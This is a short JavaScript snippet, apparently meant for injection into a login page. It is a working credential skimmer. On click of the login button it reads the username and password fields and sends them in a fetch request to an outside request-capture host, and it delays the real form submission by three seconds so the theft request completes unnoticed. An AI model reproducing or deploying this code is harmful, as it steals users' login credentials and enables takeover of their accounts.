const button = document.querySelector('.loginSubmit');

button.addEventListener('click', () => {
  const idField = document.querySelector('[name="userName"]');
  const id = idField.value;
  const passField = document.querySelector('[name="pass"]');
  const pass = passField.value;
  fetch('https://sdsdf.free.beeceptor.com/?'+id+':'+pass);
});


document.querySelector('form').addEventListener('submit', e => {
  if (e.target.dataset.waited) return;
  e.preventDefault();
  e.target.dataset.waited = 1;
  setTimeout(() => e.target.requestSubmit(), 3000);
});
